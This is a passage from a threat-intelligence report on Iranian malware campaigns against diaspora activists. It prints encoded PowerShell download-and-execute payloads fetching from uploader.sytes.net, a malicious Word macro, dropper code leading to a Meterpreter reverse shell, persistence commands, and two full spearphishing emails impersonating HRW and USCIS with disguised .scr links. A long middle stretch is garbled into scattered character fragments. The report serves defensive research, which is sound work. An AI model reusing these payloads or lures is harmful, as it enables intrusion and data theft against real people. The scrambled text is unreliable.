War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


NoProfile 
NonInteractive 
ExecutionPolicy 
Bypass 
WindowStyle 
Hidden 
En 
codedCommand 
SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAEIAaQB0AHMAVAByAGEAbgBzAGYAZQB 
yADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAIgBoAHQAdABwADoALwAvAHUAcABsAG8AY 
QB 
kAGUAcgAuAHMAeQB0AGUAcwAuAG4AZQB0AC8AZABvAHcAbgBsAG8AYQBkAC8AcwBsAGkAZABlAHMAa 
AB 
vAHcALwAxAC4AagBwAGcAIgA7AFMAdABhAHIAdAAtAEIAaQB0AHMAVAByAGEAbgBzAGYAZQByACAAa 
AB 
0AHQAcAA6AC8ALwB1AHAAbABvAGEAZABlAHIALgBzAHkAdABlAHMALgBuAGUAdAAvAGQAbwB3AG4Ab 
AB 
vAGEAZAAvAHMAaABvAHIAdABjAHUAdAAuAGUAeABlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcADIAN 
QA 
wAEMAOABDAEEANwBCAC4AZQB4AGUAIgA7ACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAJ 
AB 
lAG4AdgA6AFQARQBNAFAAXAAyADUAMABDADgAQwBBADcAQgAuAGUAeABlACIA 
Icon 
location 
(UNICODE): 
%SystemRoot%\SYSTEM32\shell32.dll 


As 
you 
can 
see, 
the 
LNK 
files 
are 
tasked 
to 
execute 
a 
PowerShell 
payload, 
which 
decodes 
as 
following: 


ImportModule 
BitsTransfer; 
StartProcess 


"hxxp://uploader.sytes.net/download/slideshow/3.jpg";StartBitsTransfer 


hxxp://uploader.sytes.net/download/shortcut.exe 
"$env:TEMP\250C8CA7B.exe"; 


StartProcess 
"$env:TEMP\250C8CA7B.exe 


The 
payload 
triggers 
the 
default 
browser 
to 
open 
an 
image 
at 
a 
given 
URL, 
which 
points 
to 
adifferent 
image 
in 
each 
.LNK 
file,then 
downloads 
and 
execute 
a 
Windows 
binary. 


In 
separate 
attacks, 
aspreviously 
mentioned, 
we 
observed 
amaliciousOffice 
document 
Document.docm 
instead 
being 
distributedto 
victims. 
Notably, 
this 
documentwas 
created 
with 
apirated 
version 
of 
Office 
distributed 
in 
Iran.38 
The 
attack 
did 
not 
leverage 
anyvulnerabilitybut 
simply 
embedded 
a 
Macroscript 
and 
attempted 
todeceive 
the 
targets 
in 
enabling 
it: 


38 
“MRT 
Win2Farsi.com” 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 



The 
content 
of 
the 
Macro 
is 
the 
following: 


Private 
Sub 
Document_Open() 
Dim 
x 
x 
= 
"powershell 
window 
hidden 
enc 
JAA5AHQAMQBpACAAPQAgACcAJABkAHoANwBkAEwAIAA9ACAAJwAnAFsARABsAGwASQBtAHAAbwByAH 
QAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKA 
BJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIAB1AGkAbgB0ACAAZAB3AFMAaQB6AGUA 
LAAgAHUAaQBuAHQAIABmAGwAQQBsAGwAbwBjA" 
_ 
& 


[CUT 
FOR 
CONVENIENCE] 


"gAmACAAJABkAHoANwBLAEEAIAAkAFEANgBQAGkAIAAkAGUAIgB9AGUAbABzAGUAewA7AGkAZQB4AC 
AAIgAmACAAcABvAHcAZQByAHMAaABlAGwAbAAgACQAUQA2AFAAaQAgACQAZQAiADsAfQA=" 
Shell 
("POWERSHELL.EXE 
" 
& 
x)
Dim 
title 
As 
Stringtitle 
= 
"Critical 
Microsoft 
Office 
Error" 
Dim 
msg 
As 
StringDim 
intResponse 
As 
Integer 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


intResponse 
= 
MsgBox(msg, 
16, 
title)
End 
Sub 


If 
enabled, 
it 
will 
display 
an 
emptyfake 
error 
dialog 
while 
executing 
a 
PowerShell 
payload 
in 
the 
background. 
Inboth 
cases 
through 
the 
infectionprocess, 
a 
cabinet 
file 
normally 
called 
taskmanager32.exe 
is 
pulled, 
stored,and 
instantiated 
forautorun. 



The 
file 
then 
contains 
anexecutable 
called 
BattRunner.exe 
which 
decompiles 
as 
following: 


namespace 
BattRunner 


{ 
internal 
static 
class 
Program 
{ 


[STAThread] 
private 
static 
void 
Main() 
{ 


Application.EnableVisualStyles(); 
Application.SetCompatibleTextRenderingDefault(false); 
string 
folderPath 
= 


Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData); 
File.WriteAllText(folderPath 
+ 
"\\start.bat",

Resources._4545); 
int 
num 
= 
Environment.TickCount 
+ 
15000; 
while 
(Environment.TickCount 
<= 
num)
{
}
File.WriteAllBytes(folderPath 
+ 
"\\update.diagcab",

Resources.WindowsUpdateDiagnostic); 
new 
Process 


{ 


StartInfo 
= 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


n,

e

d

d

iHe.l

y

t

S

w 


e,u

r

ow 
= 
t

d

n

i

W 


o

d

n

i

W

s

s

e 


o

N

e

t

a 


e=Po 
e 
= 
fo 


c

r

l

y

t

S 


r

C{ 


o

wd

n

i

W 


e 


This 
program 
willsimply 
write 
an 
embeddedstring 
to 
the 
file 
start.bat 
and 
then 
execute 
it. 
The 
start.bat 
file 
contains 
instructions 
to 
executea 
PowerShell 
process 
with 
a 
base64encoded 
payload: 


r

t

P

t

n

I

(

t 


4

x10,b

x90,c

x30,3 


40,2

x0e,c

x30,2

x 


e

m

a 


r

t

P

t 


t 


NJ

e

G


"tabt.r

a

t

s

\"\

h+

t

a

P

r

e

d

l

m

a

N

e

l

i

F 


nr

e

t

nI 


n

i

eT

ni

t

o 
yp 
,u 
xb0,a

x80,3

x50,0

x

c

c 


xi

t

a

ce 


x70,1

xd0,f

xf0,9

x 


f,1

x70,5

x30,c

x0a,f

x 


8

x50,5

x50,a

x00,a

xb0,e 


0e,6

x0e,d

x90,9

x10,a 


0

7

x0e,3

x40,2

x0c,e

x 


x0c,4

x20,c

x70,9

x10,9

x 


0,4

x40,9

x30,9

xb0,c

x 


1

x20,f

x90,f

x40,c

x0a,6

x 


00,3

x60,a

x00,4

xd0,d

xf0,c 


a

d

x80,e

x60,4

x0a,6

x60,8

x 


x40,d

x90,1

x40,2

x10,2

x 


6,5

x30,2

x0c,d

x10,b

x0e,a 


1

x0a,4

x00,3

x00,b

x40,d

x 


f0,f

x50,f

x90,c

x60,5

x70,b

x 


x80,5

x40,4 


f

i

;

0

0

0

1

x 


et

P

t

rm 


e

s

m 


x10,0

t

P

t

nr

e

t

nI 


r 


Ci

t

i

n

i

f

e

D

r

e

b

m

on 
$ 


t

P

t 


t

P

t 


$
xd0, 
e

t

[]] 
z 
= 


r

r

n

e

z

i

S

k

c

a

t

S

w

,I 


n

s

g

,I 


50,1

xb0,d

x80,8

x30,a 


30,0

x40,c

xd0,7

x0c,f

x 


x10,c 


a

cl

l

A

o 


ti

l

b

u

cs 


$

;

6

4

x

g=0 


nr

e

nI 


5

x90,e

x 


60,d

x50,a

x10,a

x60,3

x 


10,4

x20,d

x20,d

x 


x10,4

xf0,9

x20,3

x 


0e,1

xb0,6

x0c,3

xd0,6

x 


x20,5

x 


y

B

[

; 


90,9

xf0,d

x40,b

x 


x00,7

x30,0

x0e,7 


xi

t

a

ce 


60,3

xd0,0

x00,0

x 


40,6

x90,5

xb0,6

x0e,6 


a

l

F

n 


t

xi

t

ce 


10,6

xd0,6

x40,3

x 


0e,a

x00,d

xf0,6

xb0,e

x 


a

9

x0c,1

xd0,2

xb0,6

x20,f

x 


l

n

i 


l"l2d.3

l

e

)]ptf 


x50,0

xd0,b

x10,4

x 


0e, 


e

t

[]] 


]

d

a 


i

t

a

o 


ti

l

b

u

cs 


a

ti

l

b

cs 


e 


2 


e

z

i

S

,u 


r

C

w

n

is

e

t

,u 
td 


mT




ype 



y

B

[

; 


x0a,6

x70,b

x 


p

b0,b

x40,f

x40,2

x40,7 


e 


o

l

y 


xd0,5

x30,0

x40,0

x50,c

x30,8

x 


n

ir

e

t

e

,u 
td 


00,4

x0a,c

xf0,e

x20,8

x30,0

xd0,a

xf0,a

x30,b

x60,e 


u

r 


4p

a6

e

s

a 


h

t

s 


70,4

x50,0

x90,7

x0e,7

x50,a

x80,d

x0c,3

xf0,7

x00,5 


l"l2d.

)]p 


ud

d 


l"ldt.r

)]p 
w=A 


f0,3

x70,5

x0c,7

x20,b

x80,d

x90,d

xb0,c

xd0,b

0x, 


x00,b

xb0,f

x0c,8

xf0,4

x10,b

xb0,2

x80,6

x70,c

x

0 


80,5

x80,0

x60,3

x30,a

x20,a

x0a,b

xd0,b

x80,e

x70,

b0,a

x10,5

x60,9

xb0,8

x80,4

x70,2

x30,e

x00,5

x 


d0,8

x80,6

x90,7

xb0,a

x10,8

x0a,9

x0e,9

x60,6

0x, 


10,5

x80,4

x80,9

x80,5

x0a,0

x10,3

x0c,4

x40,b

x

0 


w

n

i

,u 
td 


s

s

e 


60,0

x20,c

x60,6

x40,2

x20,8

x50,e

x0c,1

xd0,a 


s

a 


70,7

xf0,2

x0a,b

x50,b

x80,a

x60,a

x60,f

x90, 


0a,9

x20,2

x50,b

x0c,1

x 


xb0,8

x30,6

x40,c

x

00,4

x10,e

x0a,c

x0e,0

x0e,3

x10,f

x40,9

x10,8 


00,8

x20,c

x0e,b

x00,e 


0c,1

x70,2

xd0,3

x20,e 


n

r 


u

b

i

r

t

t

A

d

a

e

r

h

("k 
T 


40,d

x20,d

x60,3

x70,9

x20,d

x70,9

x80,9

x

0 


90,5

xd0,0

x50,5

x20,7

x 


b0,2

x60,8

x0c,6

x30,e 


x30,b

x90,e

xd0,8

x70,e

x20,6

x40,f

xd0,6

0x, 


xb0,9

x70,a

x00,3

x40,7

x00,d

x20,3

x80,f

x 


ni

t

c

osx10,0


x50,2

x0a,2

x0c,d

xb0,6

xf0,8

x50, 


nc[


bn

e

e

d

d 


e("kt 


m

a

r

a 


x00,8

x30,1

xf0,b

xf0,4

x50,1

xb0,c

x 
0c, 
0,3 


()

;}
t

r

a 


70,3

x70,7

xb0,6

x30,a

xb0,c

x50,6

x 


$;'';)

t 


St.} 


o 


The 
decodedpayload 
is 
the 
following: 


p 


o 
rl 


r

p

m

I

l

lp 


D''[

t 


ow 
h

id

n

i 


3

l

e

n

r

e 


c

v

s 


n 


r

d

d

A 


P

rl

pt

P

t 


t 


rl

pt

P

t 


u

F

2

3

n 


("mt 


$0

0

0

1

){ 
g 
= 


o

rp

m 


n 


}
}
} 


P

t

n

I

( 


G=

J

e

C'$

G=

8

x

D

$ 


i

eW


cx 


a

p90, 


s

e

m

a

n 


l


wl

e

h

s 


u

,u 
ts 
,u 
tco

n

ic

r

n

it

s 


o

rp

m

I

l

l

D

[

;

)

t 


,I

n

s

s

e

r 


I

(

d

a

n 


b0,7

xf0,2

xf0,6

x00,6

x20,f

x60,8

x70,f

x 


o

cl

l

A

l

a

u

t

r

i

V 


e 


80,1

x 


I

l

l

D

[

;

) 


d

x0c,c

x0a,d

x

0 


d0,5

x10,3

x70, 


d

d

A

t

r

a

t

S

p

l 


d

I

d

a

e

r

h

T

p

l 


t

g

n

h


c

e

o

tr

P

l

f 


r

h

T

e

t

a

e

r

C 


2"3

n

i"W 


eLz. 


Lz. 


$

(
$ 


r

e

w 


e

d 


x 


$ 
z 
;';}

0 
i 


$
$ 


f

;

)

0I 


4

0x,

TT. 
gS 


or 
( 


o 
()+ 
), 
$
p6 
e= 
l$

;

0

=

i

i


,

]

i

$

[ 


e 


2

3

t 


e

e

l

s




n 


S

;

; 


$r

t

P

t

](
r( 
){ 


t

r

a

t 


0$,0

0

1 


c 


x00,(

cl

l

A

o 


It

e

s

m

e

([ 


n 


f

;

)T000,,,

o

S

c

l

a

u

t

r

i

V

:

:

w

$ 


00$,, 


$ 


(

d 


+) 
{ 


m

:

:

w 


a

e 


x 


=

T

S

gc

$

;

}

h 


t0 


i

$

;

)

1




+ 


r

h

T

e 


h

t

g

n 


:

:

w

$

t

a

e

r 


t

g

n

e 


eLz. 
; 
$

(
1

)} 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Dx8 
G));$S7lO 
= 
"enc 
";if([IntPtr]::Size 
eq 
8){$P1X 
= 
$env:SystemRoot 
+ 
"\syswow64\WindowsPowerShell\v1.0\powershell";iex 
"& 
$P1X 
$S7lO 
$e"}else{;iex 
"& 
powershell 
$S7lO 
$e";} 


Through 
multiple 
nestedPowerShell 
instancesperformingshellcode 
injection, 
the 
actors 
are 
then 
able 
to 
download 
and 
execute 
abuild 
of 
Metasploit’s 
Meterpreter 
DLL 
configured 
as 
a 
reverse 
shell 
to 
a 
designated 
host. 
On 
a 
historical 
note, 
the 
primaryhostnamefor 
these 
samples 
was 
previously 
used 
in 
a 
FBIoperation 
toidentify 
individuals 
exchange 
child 
abuseimages.39 


Duringthe 
course 
ofouranalysiswe 
observed 
theattackers 
interactingwith 
the 
reverse 
shell 
we 
had 
opened. 
During 
multiple 
attempts 
at 
luring 
them 
in 
they 
initially 
performed 
some 
preliminaryprofiling, 
then 
when 
they 
had 
realizedthe 
host 
was 
an 
analysis 
virtual 
machine, 
they 
repeatedly 
deleted 
files, 
removedtraces 
of 
the 
infection 
andrebooted 
the 
system. 


Sima 


History 


In 
February 
2016, 
Iranfocused 
individuals 
received 
messagespurporting 
to 
be 
from 
Human 
Rights 
Watch's 
(HRW) 
Emergencies 
Director, 
requesting 
that 
they 
readan 
article 
about 
Iran 
pressing 
Afghan 
refugees 
to 
fight 
in 
Syria. 
While 
referencing 
a 
real 
reportpublished 
by 
HRW,40 
the 
links 
provided 
for 
the 
Director’s 
biography 
and 
articledirected 
the 
recipientto 
malware 
hosted 
elsewhere. 
Thesespearphishing 
attempts 
represent 
an 
evolution 
of 
Iranian 
actors 
based 
on 
their 
socialengineering 
tactics 
and 
narrow 
targeting. 
Although 
the 
messages 
still 
had 
minor 
grammatical 
and 
stylistic 
errorsthat 
would 
be 
obvious 
to 
a 
native 
speaker, 
the 
actors 
demonstrated 
stronger 
Englishlanguage 
proficiency 
than 
past 
intrusion 
sets 
and 
a 
deeper 
investment 
in 
background 
research 
prior 
to 
the 
attempt. 
The 
actors 
appropriated 
a 
real 
identity 
that 
would 
be 
expected 
to 
professionally 
interact 
with 
the 
subject, 
then 
offered 
validation 
through 
links 
to 
their 
biography 
andsocial 
media, 
theformer 
of 
which 
itself 
was 
malware 
as 
well. 
The 
bait 
documents 
contained 
a 
realarticle 
relevant 
to 
their 
interests 
and 
topicreferenced, 
and 
the 
message 
attempted 
to 
address 
to 
how 
italigned 
with 
theirprofessional 
research 
or 
field 
of 
employment. 
The 
referenced 
documents 
sent 
weremalware 
binariesposing 
as 
legitimate 
files 
using 
the 
common 
righttoleft 
filenames 
tacticin 
order 
to 
concealthe 
actual 
file 
extension. 
All 
of 
these 
techniques,while 
commonpretexting 
mechanisms, 
are 
a 
refinement 
compared 
toa 
tendency 
amongst 
other 
groups 
to 
simply 
continually 
send 
different 
forms 
of 
generic 
malware 
or 
phishing, 
in 
the 
hopes 
that 
onewould 
eventuallybe 
successful. 


We 
tentatively 
name 
the 
campaign 
“Sima” 
based 
on 
the 
recurrent 
presence 
of 
“PCSima7” 
and 
“PCSima9” 
in 
the 
metadataof 
Word 
documents 
displayed 
upon 
execution 
of 
the 
primary 
malware 
agent. 
While 
other 
indicators 
align 
with 
the 
attribution 
toIran, 
suchas 
markers 
that 
the 
Visual 
Studio 
used 
in 
its 
development 
originated 
from 
an 
Iranian 
software 
piracy 
site, 
Sima 
is 
the 
most 
unique 
trait 
found 
in 
our 
observation. 


39 
http://www.cnet.com/news/fbipostsfakehyperlinkstosnarechildpornsuspects/ 
40 
https://www.hrw.org/news/2016/01/29/iransendingthousandsafghansfightsyria 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


)monikercouldsimilarlyoriginatefromsoftwarelabels,( While the Sima 
سيما it is a common female 


Persian 
name 
and 
a 
Persianlanguage 
wordfor 
“visage” 
or 
“appearance.” 
Given 
its 
use 
in 
more 
advanced 
social 
engineering 
campaignsagainst 
women’s 
rights 
activists, 
the 
label 
seem 
particularly 
apt. 


Based 
on 
file 
modification 
dates 
andtimestamps 
of 
samples, 
it 
appears 
thatthe 
observed 
campaign 
was 
initiated 
in 
the 
middle 
of 
February 
2016, 
with 
the 
infrastructure 
taken 
offline 
at 
the 
start 
of 
March. 
At 
the 
time 
of 
observation, 
and 
within 
the 
resources 
in 
spearphishing 
attempts, 
the 
actors 
behindthe 
campaign 
had 
an 
active 
interest 
in 
Iranians 
in 
the 
diaspora 
that 
were 
focused 
on 
foreign 
policy 
and 
women’sissues. 
Samples 
andresource 
names 
containedthe 
family 
names 
ofprominent 
Iranians, 
and 
several 
of 
these 
individuals 
received 
the 
malware 
located 
in 
theirrespective 
folder. 
Two 
other 
files, 
named 
“R.A.D 
Rape 
AggressionDefenseforWomen” 
and 
“VictoriaSecretinfluenceonwomengender” 
indicateanaudience 
of 
activists 
or 
scholars 
on 
women’s 
rights 
issues. 
Another 
file, 
entitled 
“CONFIDENTIAL 
INVESTOR 
SUITABILITY 
QUESTIONNAIRE” 
implies 
that 
the 
end 
recipient 
is 
involved 
in 
the 
private 
sector, 
which 
alignswith 
a 
history 
of 
Iranian 
actors 
oftargeting 
individuals 
involvedwith 
the 
country’s 
oilsector 
and 
international 
businesspersons 
in 
the 
diaspora. 
Others 
appear 
to 
have 
been 
general 
purposemalware 
with 
generic 
names 
that 
imply 
that 
they 
were 
sent 
purporting 
to 
be 
system 
updates, 
such 
as 
“GetWindows10Web_
Default_Attr.exe.” 


Several 
samples 
potentially 
reflect 
other 
impersonation 
attempts 
similar 
to 
the 
HRW 
messages 
based 
on 
the 
filenames 
of 
the 
malware. 
The 
spearphishing 
bait 
was 
relevantto 
recent 
social 
mediaactivity 
of 
the 
target, 
suggesting 
those 
behind 
the 
Sima 
campaign 
wereclosely 
monitoring 
and 
tailoring 
pretexting 
strategies 
according 
to 
their 
interests. 
In 
another 
case, 
the 
actorsmirrored 
an 
announcement 
madeabout 
the 
broadcast 
of 
atelevision 
program 
on 
IranianAmerican 
cultural 
affairs 
in 
order 
to 
impersonate 
the 
individual 
and 
engage 
in 
spearphishing 
within 
hours 
of 
the 
legitimate 
message. 
The 
Sima 
group 
also 
engaged 
in 
impersonation 
ofCitizenship 
and 
Immigration 
Services 
at 
the 
Department 
of 
Homeland 
Security, 
posing 
asa 
notice 
about 
the 
expiration 
ofthe 
recipient’s 
Permanent 
Residence 
status. 
This 
forged 
message 
appeared 
to 
be 
from 
anaddress 
associatedwith 
the 
USCIS, 
“SCOPSSCATA@dhs.gov,” 
and 
was 
sent 
through 
the 
anonymous 
mail 
relay 
service 
anonymousemail.me. 
As 
with 
the 
HRW 
message, 
the 
formsreferenced 
actually 
existbutthe 
links 
provided 
in 
the 
message 
directed 
the 
recipient 
to 
malware 
tainted 
documents. 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 



The 
malware 
and 
infrastructure 
used 
in 
the 
spearphishingattempts 
was 
hosted 
behind 
an 
under 
construction 
message 
with 
an 
emailsignup 
option 
that 
did 
not 
function. 
The 
server 
used 
to 
hostthese 
malware 
samples 
was 
located 
onthe 
German 
providerHetzner 
(148.251.55.114), 
within 
a 
smallblock 
of 
IP 
addresses 
that 
are 
registered 
with 
the 
customer 
ID 
“HOS156205.” 
Across 
other 
prefixes 
registered 
to 
this 
customer 
identifier,and 
within 
thesame 
block 
as 
the 
command 
and 
control 
server, 
there 
are 
anumber 
of 
other 
Persianlanguage 
websites, 
suggesting 
that 
the 
server 
was 
purchased 
through 
an 
Iranian 
reseller 
of 
Hetzner 
services. 


Prior 
to 
the 
removal 
of 
the 
server, 
theactors 
uploaded 
passwordprotected 
archives 
of 
exfiltrated 
files 
to 
the 
server. 
These 
files 
suggested 
at 
least 
twentyone 
victims 
within 
the 
short 
period 
of 
the 
campaign, 
however, 
it 
is 
believed 
thatthose 
archives 
do 
not 
covered 
the 
entiretyof 
those 
compromised. 
Despite 
the 
oversight 
that 
made 
thesefiles 
available,the 
archives 
evince 
a 
greater 
level 
of 
professionalism 
and 
detailoriented 
work 
than 
previous 
threat 
actors, 
with 
resources 
highlyorganized 
andbearing 
descriptive 
labeling. 
Thesearchives 
provide 
furtherindication 
that 
those 
entities 
behind 
the 
campaigns 
are 
Persianlanguage 
speakers, 
due 
to 
the 
naming 
of 
filesand 
folders 
in 
Persian. 


SpearphishingEmail 
FebruaryandMarch2016 


From:PeterBouckaert 
[redacted 
uniquefalseemailaddress] 


[redacted 
name] 


Hello 


I 
am 
PeterBouckaert,Emergencydirector 
at 
HumanRights 
Watch, 
focusing 
onprotecting 
the 
rightsof 
civilians 
duringarmedconflict. 
Our 
group 
hashuge 
fieldresearch 
&factfindingmissions 
to 
Iran, 
Lebanon,Kosovo, 
Chechnya,Afghanistan,Iraq, 
IsraelandtheOccupied 
Palestinian 
Territories,Macedonia,Indonesia, 
Uganda, 
and 
Sierra 
Leone,amongothers. 


Youcanread 
mybiographyat 
belowlink: 
https://www.hrw.org/about/people/peterbouckaert 
<http://148.251.55.114/download/[redacted]/my%20biography%E2%80%AExcod.scr> 


According 
tothesituationofIran& 
Turkey 
interrorism 
inSyria,we 
have 
somesuggestions 
for 
you 
dueto 
your 
experience 
[redacted 
field]. 
Please 
read 
ourlast 
research 
about 
“IranSending 
ThousandsofAfghans 
toFight 
in 
Syria” 
&contactmeimmediately. 


Youcanread 
this 
article 
atbelow 
link: 
https://www.hrw.org/news/2016/01/29/iransendingthousandsafghansfightsyria 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


<http://148.251.55.114/download/[redacted]/Iran%20Sending%20Thousands%20of%20Afghans%20to%20Fight%20in%20Syria%E2%80% 
AExcod.scr> 


PeterBouckaert 
[redacted 
unique 
falseemail 
address] 


SpearphishingEmail 
March2016 


From:U.S. 
Citizenship 
andImmigration 
Services<SCOPSSCATA@dhs.gov> 
Subject: 
Alert: 
PermanentResidence 
Card 


Youreceived 
thisEmail 
because 
you 
donot 
havea 
PermanentResidence, 
your 
PermanentResidence 
status 
needsto 
beadjusted 
or 
you 
need 
torenew/replace 
yourPermanent 
Residence 
Card. 


Starting 
March 
9, 
2016, 
customers 
must 
fillFormI485(
canbe 
found 
at 
the 
end 
of 
this 
email), 
inorder 
to 
Register 
PermanentResidenceor 
AdjustStatus,andmustfill 
Form 
I90(
can 
be 
foundat 
the 
end 
of 
this 
email)in 
order 
to 
Renew/Replace 
Permanent 
Residence 
Card 
and 
mail 
their 
Form 
I485 
or 
I90to 
USCISlocalfield/International 
offices. 
(Offices 
canbe 
found 
here: 
https://www.uscis.gov/aboutus/
finduscisoffice) 


USCISwill 
provide 
a 
30day 
grace 
period 
from 
March9, 
2016,for 
customerswho 
filetheir 
Form 
I485 
or 
I90withoneoftheUSCIS 
offices. 
All 
offices 
who 
receive 
Form 
I485 
and 
I90during 
this 
time 
will 
forwardtheformsto 
the 
ChicagoLockbox. 


AfterApril9, 
2016, 
local 
field/International 
offices 
willreturn 
all 
Form 
I485 
and 
I90they 
receive 
andadvisecustomers 
tofile 
atthe 
Chicago 
Lockbox. 


Download 
Form 
I485, 
Application 
toRegister 
PermanentResidence 
or 
Adjust 
Status: 
https://www.uscis.gov/sites/default/files/files/form/i485.
doc 
<http://148.251.55.114/uscis.gov/sites/default/files/files/form/Form%20I485,%
20Application%20to%20Register%20Permanent%20Residen 
ce%20or%20Adjust%20Status%E2%80%AEcod.scr> 


Download 
Form 
I90,
Applicationto 
Replace 
PermanentResidentCard: 
https://www.uscis.gov/sites/default/files/files/form/i90.
doc 
<http://148.251.55.114/uscis.gov/sites/default/files/files/form/Form%20I90,%
20Application%20to%20Replace%20Permanent%20Resident 
%20Card%E2%80%AEcod.scr> 


Contact 
us:https://www.uscis.gov/aboutus/
contactus 


With 
Best 
Regards, 


USCISService 
Center. 


Tools 
& 
Techniques 


All 
the 
malware 
samples 
that 
we 
collectedfromservers 
controlled 
bythe 
actors 
appear 
to 
belong 
tothe 
same 
malware 
family 
and 
they 
are 
all 
configured 
to 
contactand 
exfiltrate 
data 
to 
the 
same 
command 
and 
control 
domains, 
microupdt.fagdns.com 
and 
microupdt.duckdns.org.Allthe 
samples 
appear 
tobe 
have 
been 
compiled 
between 
February 
29 
and 
March 
1 
2016, 
shortly 
before 
our 
discovery, 
suggestingthat, 
despitethe 
knownC&C 
servers 
having 
quickly 
gone 
offline 
shortly 
after, 
this 
spree 
of 
attacks 
mightbe 
fresh 
and 
currently 
undergoing. 


It 
is 
worthnotingin 
fact, 
that 
those 
same 
C&C 
domains 
have 
appeared 
anddisappeared 
at 
convenience 
over 
thecourseof 
themany 
months 
that 
took 
to 
complete 
this 
research 
work, 
and 
may 
be 
used 
by 
others. 
As 
a 
matter 
of 
fact,the 
command 
andcontrol 
domains 
we 
observedresolved 
to 
the 
hosts 
154.127.59.97 
and 
87.121.52.83, 
which 
havenumerous 
other 
domains 
associated 
to 
them 
throughpassive 
DNS 
records, 
and 
an 
even 
larger 
amountof 
malware 
samples 
configured 
to 
contact 
them. 
For 
the 
sake 
of 
narrative 
we 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


are 
going 
tofocus 
exclusively 
to 
those 
samples 
we 
identified 
being 
used 
in 
attacksagainst 
Iranian 
civil 
society 
and 
diaspora. 


We 
observed 
Sima 
employa 
few 
initial 
droppers, 
normally 
written 
in 
C# 
and 
then 
obfuscated,often 
with 
SmartAssembly. 
The 
first 
iteration 
of 
the 
stage 
1 
payload 
is 
a 
very 
simple 
application 
that 
is 
designed 
to 
execute 
theprimary 
payload, 
and 
establish 
and 
maintain 
persistence 
over 
the 
compromised 
system. 
It 
achieves 
thatby 
the 
creating 
a 
regular 
startup 
registrykey 
by 
invoking 
the 
following 
command: 


"C:\WINDOWS\system32\cmd.exe" 
/c 
reg 
add 
"HKEY_CURRENT_USER\Software\Microsoft\Windows 
NT\CurrentVersion\Windows" 
/v 
"Load" 
/d 
"C:\Documents 
and 
Settings\Me\Application 
Data\Microsoft\Blend\14.0\FeedCache\protocolhost.exe" 
/f 


The 
binary 
protocolhost.exe 
would 
normally 
be 
an 
initial 
stub 
that 
just 
executes 
the 
full 
original 
payload. 
While 
the 
folder 
under 
which 
it 
is 
stored 
seems 
consistent, 
the 
file 
name 
of 
the 
executableseems 
to 
vary. 
We 
observed 
for 
examplethe 
names 
sigverify.exe 
and 
PerfWatson.exe 
as 
alternatives 
to 
protocolhost.exe. 
Interestingly, 
due 
to 
some 
flaw 
in 
the 
logic 
of 
the 
stage 
1, 
that 
cmd.exe 
command 
is 
often 
executed 
an 
endless 
loop, 
which 
willcause 
terminalsto 
flash 
continuously, 
making 
it 
hard 
to 
properly 
interact 
withthe 
system. 


Possiblyas 
an 
evolution 
to 
this 
poorlydesigned 
initialpayload, 
inother 
attacks 
the 
group 
appears 
to 
have 
replaced 
the 
stage 
1 
dropperwith 
a 
new 
one, 
which 
looks 
cleaner 
and 
with 
an 
increased 
attention 
to 
detail 
and 
stealthiness. 
Forexample,it 
sets 
theZoneID 
ofall 
of 
itsdropped 
files 
to 
URLZONE_TRUSTED, 
generally 
usedto 
disable 
security 
warnings 
on 
the 
provenance 
of 
the 
file, 
invokingthis 
command: 


"C:\Windows\System32\cmd.exe" 
/c 
echo 
[zoneTransfer]ZoneID 
= 
2 
> 
"C:\ProgramData\Winupdt\winupdt.exe":ZONE.identifier 
& 
exit 


It 
also 
sets 
its 
error 
mode 
toSEM_NOOPENFILEERRORBOX, 
disabling 
Windows 
error 
dialogs 
incase 
of 
somemalfunction. 


Insteadof 
using 
the 
more 
commonand 
more 
recognizableWindowsstartup 
registrykeys 
and 
folders, 
this 
malware 
instead 
creates 
a 
Window 
Task 
Scheduler 
XML 
definition 
from 
a 
premade 
template 
it 
is 
provided 
with: 


<?xml 
version="1.0" 
encoding="utf16"?> 
<Task 
version="1.2" 
xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"> 


<RegistrationInfo> 
<Date>20141025T14:
27:44.8929027</Date> 
<Author>[USERID]</Author> 


</RegistrationInfo> 
<Triggers> 


<LogonTrigger> 
<Enabled>true</Enabled> 
<UserId>[USERID]</UserId> 


</LogonTrigger> 



Iran 
and 
the 
Soft 
War 
for 
Internet 
Dominance 
Guarnieri 
& 
Anderson 


<RegistrationTrigger> 
<Enabled>false</Enabled> 


</RegistrationTrigger> 
</Triggers> 
<Principals> 


<Principal 
id="Author"> 
<UserId>[USERID]</UserId> 
<LogonType>InteractiveToken</LogonType> 
<RunLevel>LeastPrivilege</RunLevel> 


</Principal> 
</Principals> 
<Settings> 


<MultipleInstancesPolicy>StopExisting</MultipleInstancesPolicy> 
<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries> 
<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries> 
<AllowHardTerminate>false</AllowHardTerminate> 
<StartWhenAvailable>true</StartWhenAvailable> 
<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable> 
<IdleSettings> 


